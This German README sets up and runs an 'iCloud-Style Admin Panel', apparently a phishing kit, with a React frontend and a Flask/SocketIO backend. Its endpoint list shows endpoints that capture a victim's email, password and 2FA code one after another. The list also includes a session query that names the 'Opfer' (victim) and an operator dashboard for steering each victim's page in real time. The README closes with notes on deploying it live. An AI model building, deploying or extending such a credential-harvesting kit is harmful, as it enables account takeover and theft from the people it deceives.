# iCloud-Style Admin Panel

Ein React-Frontend (Vite) mit einem Python-Flask-Backend. Das Design ist bereits im `frontend/`-Ordner vorhanden; dieses Projekt ergänzt das fehlende Backend, die Datenbank und die Echtzeit-Updates via SocketIO.

## Projektstruktur

```
redesign/
├── backend/              Python-Backend
│   ├── app.py            Flask + SocketIO + SQLite
│   ├── requirements.txt  Python-Abhängigkeiten
│   └── app.db            SQLite-Datenbank (wird automatisch erstellt)
├── frontend/             React-Frontend (Vite)
│   ├── package.json
│   └── src/...
├── run.py                Einfacher Starter für das Backend
└── README.md
```

## Schnellstart

### 1. Python-Backend starten

Stelle sicher, dass Python 3.10+ installiert ist.

```powershell
# Erstelle ggf. ein Virtual Environment (empfohlen)
python -m venv venv
.\venv\Scripts\activate

# Installiere Abhängigkeiten
pip install -r backend\requirements.txt

# Starte das Backend
python run.py
```

Das Backend läuft dann unter **http://localhost:4000**.

### 2. Frontend starten

In einem neuen Terminal:

```powershell
cd frontend
npm install
npm run dev
```

Das Frontend läuft dann unter **http://localhost:3000** und leitet alle `/api`-Aufrufe an das Backend weiter.

## Admin-Login

Nach dem ersten Start wird automatisch ein Admin-Account erstellt:

- URL: http://localhost:3000/admin/cloud/login
- Benutzername: `admin`
- Passwort: `admin`

Du kannst die Werte über Umgebungsvariablen ändern:

```powershell
$env:ADMIN_NAME="dein-name"
$env:ADMIN_PASSWORD="dein-passwort"
$env:SECRET_KEY="ein-starker-schluessel"
python run.py
```

## Wichtige Endpunkte

- `GET /api/v1/rumman/auth/me` – aktuelles Opfer/Session abfragen
- `POST /api/v1/rumman/auth/first-register` – E-Mail speichern
- `POST /api/v1/rumman/auth/second-register` – Passwort speichern
- `POST /api/v1/rumman/auth/verification-code` – 2FA-Code speichern
- `POST /api/v1/rumman/auth/login` – Admin-Login
- `GET /api/v1/rumman/user/all-user` – Alle Sessions (Dashboard)
- `POST /api/v1/rumman/user/page/<id>/<page>` – Seite/Status ändern

## Hinweise

- Für die Produktion sollte das Frontend mit `npm run build` gebaut und vom Backend ausgeliefert werden (siehe `backend/app.py` – `serve_frontend`).
- Ändere `SECRET_KEY` und `ADMIN_PASSWORD` vor dem Live-Betrieb unbedingt ab.
